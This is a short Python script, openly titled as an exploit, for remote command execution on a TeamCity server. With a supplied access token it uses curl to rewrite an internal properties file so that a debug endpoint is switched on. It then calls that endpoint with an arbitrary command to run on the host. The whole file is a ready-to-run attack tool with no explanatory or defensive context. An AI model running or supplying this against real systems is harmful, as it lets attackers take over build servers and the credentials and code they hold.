import argparse
import subprocess
import time

def main():
    parser = argparse.ArgumentParser(description="Exploit for RCE on TeamCity")
    parser.add_argument("-t", "--token-file", required=True, help="File containing the token")
    parser.add_argument("-c", "--command", required=True, help="Command to execute")
    parser.add_argument("-u", "--url", required=True, help="URL of the TeamCity instance")
    parser.add_argument("-p", "--port", type=int, help="Port of the TeamCity instance")
    args = parser.parse_args()

    # Read token from file
    with open(args.token_file, "r") as f:
        token = f.read().strip()

    # Set default values for URL and port
    port = args.port if args.port else 80

    # Enable debug mode
    enable_debug_command = f'curl -XPOST "{args.url}/admin/dataDir.html?action=edit&fileName=config/internal.properties&content=rest.debug.processes.enable=true" -H "Authorization: Bearer {token}" -H "Content-Type: text/plain"'
    subprocess.run(enable_debug_command, shell=True, check=True)

    # Execute the RCE command
    rce_command = f'curl -XPOST "{args.url}/app/rest/debug/processes?exePath={args.command}" -H "Authorization: Bearer {token}" -H "Content-Type: text/plain"'
    subprocess.run(rce_command, shell=True, check=True)

if __name__ == "__main__":
    main()
